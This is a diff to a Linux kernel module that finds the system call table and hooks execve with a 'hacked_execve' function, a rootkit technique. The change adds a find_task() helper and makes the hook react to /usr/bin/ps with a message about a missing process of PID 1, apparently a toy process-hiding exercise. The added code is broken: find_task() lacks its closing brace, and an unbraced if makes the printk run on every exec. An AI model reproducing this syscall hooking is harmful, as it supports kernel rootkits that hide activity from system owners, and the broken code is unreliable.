@@ -14,6 +14,9 @@ See /include/linux/syscalls.h for the function headers
 */
 
 
+
+
+
 typedef asmlinkage int (*orig_execve_t)(const char __user *, const char __user *const __user *, const char __user *const __user *); 
 orig_execve_t orig_execve;
 
@@ -36,6 +39,15 @@ unsigned long *get_syscall_table(void)
 	}
 	return NULL;
 }
+struct task_struct *
+find_task(pid_t pid)
+{
+	struct task_struct *p = current;
+	for_each_process(p) {
+		if (p->pid == pid)
+			return p;
+	}
+	return NULL;
 
 
 
@@ -55,8 +67,9 @@ asmlinkage int hacked_execve(const char __user *filename, const char __user *con
 	kfilename = kzalloc(30,GFP_KERNEL);
 	err = copy_from_user(kfilename, filename, 30);
 	if(!err){
-		if(strcmp(kfilename, "/usr/bin/touch") == 0)
-		printk("That tickles!");
+		if(strcmp(kfilename, "/usr/bin/ps") == 0)
+			find_task(1);
+		printk("You may find a process name missing...check for a PID of 1!");
 	}
 	return orig_execve(filename, argv, envp);
 }
